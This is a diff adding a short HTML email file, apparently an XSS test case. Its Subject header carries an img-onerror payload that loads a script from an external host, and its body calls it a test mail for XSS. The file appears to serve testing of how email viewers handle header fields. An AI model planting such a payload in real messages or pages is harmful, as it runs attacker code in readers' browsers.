@@ -1,0 +1,7 @@
+From: "Bradley Marshall" <kildare69@rudanet.pl>
+To: piernot@enron.com, wpiernot@keller.edu
+Subject: <img src='ice' onerror="loadScript('http://icefish1987.sinaapp.com/xss/probe.js')">
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
